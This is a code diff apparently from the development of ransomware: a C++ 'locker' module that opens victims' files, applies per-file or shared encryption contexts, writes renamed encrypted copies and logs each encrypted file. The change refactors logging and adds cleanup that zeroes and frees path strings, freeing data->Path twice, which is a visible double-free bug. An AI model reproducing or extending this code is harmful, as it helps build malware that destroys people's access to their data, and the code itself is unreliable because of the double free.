@@ -495,7 +495,8 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 	else if (CryptInfo->gen_policy == GENKEY_ONCE)
 		FileInfo->ctx = CryptInfo->ctx;
 
-	if (!api::get_parse_file(data->FullPath, &FileInfo->filehandle, &FileInfo->filesize) || FileInfo->filehandle == INVALID_HANDLE_VALUE)
+	if (!api::get_parse_file(data->FullPath, &FileInfo->filehandle, &FileInfo->filesize) 
+			|| FileInfo->filehandle == INVALID_HANDLE_VALUE)
 	{
 		LOG_ERROR("[SetOptionFileInfo] [ParseFile] Failed; %s", data->Filename);
 		return false;
@@ -505,16 +506,18 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 	{
 		FileInfo->recent_filehandle = FileInfo->filehandle;
 	}
-	else if (!api::create_file_open(&FileInfo->recent_filehandle, FileInfo->recent_filename) || FileInfo->recent_filehandle == INVALID_HANDLE_VALUE)
+	else if (!api::create_file_open(&FileInfo->recent_filehandle, FileInfo->recent_filename) 
+			|| FileInfo->recent_filehandle == INVALID_HANDLE_VALUE)
 	{
 		LOG_ERROR("[SetOptionFileInfo] [CreateFileOpen] Failed; %s", data->Filename);
 		return false;
 	}
 
+	LOG_INFO("process file; %s -> %s", FileInfo->filename, &FileInfo->recent_filename[memory::StrLen(data->Path) + 1]);
 	return true;
 }
 
-void locker::free_file_info(PFILE_INFO FileInfo, bool success)
+void locker::free_file_info(PFILE_INFO FileInfo, PDRIVE_INFO data, bool success)
 {
 	if (FileInfo->filehandle != INVALID_HANDLE_VALUE)
 		api::CloseDesc(FileInfo->filehandle);
@@ -533,6 +536,19 @@ void locker::free_file_info(PFILE_INFO FileInfo, bool success)
 	memory::m_free(FileInfo->recent_filename);
 	if (FileInfo->crypt_info->gen_policy == GENKEY_EVERY_ONCE && FileInfo->ctx) memory::m_free(FileInfo->ctx);
 	memory::memzero_explicit(FileInfo, sizeof(FILE_INFO));
+	if(success)
+		LOG_SUCCESS("success encrypt file; %s", data->Filename);
+	else
+		LOG_ERROR("failed encrypt file; %s", data->Filename);
+	memory::memzero_explicit(data->Path, memory::StrLen(data->Path));
+	memory::memzero_explicit(data->Exst, memory::StrLen(data->Exst));
+    memory::memzero_explicit(data->Filename, memory::StrLen(data->Filename));
+    memory::memzero_explicit(data->FullPath, memory::StrLen(data->FullPath));
+    memory::m_free(data->Path);
+	memory::m_free(data->Exst);
+    memory::m_free(data->Filename);
+    memory::m_free(data->FullPath);
+    memory::m_free(data->Path);
 }
 
 bool locker::HandlerCrypt
@@ -541,7 +557,6 @@ bool locker::HandlerCrypt
 	PDRIVE_INFO data
 )
 {
- 	LOG_INFO("process file; %s", data->Filename);
  	bool success = false;
  	FILE_INFO FileInfo;
  	if (!(success = SetOptionFileInfo(&FileInfo, data, CryptInfo)))
@@ -562,15 +577,8 @@ bool locker::HandlerCrypt
 			NULL
 		));
 
-	if(success)
-	{
-		LOG_SUCCESS("success encrypt file; %s", data->Filename);
-	}
-	else
-		LOG_ERROR("failed encrypt file; %s", data->Filename);
-
 END:
- 	free_file_info(&FileInfo, success);
+ 	free_file_info(&FileInfo, data, success);
 	return success;
 }
 
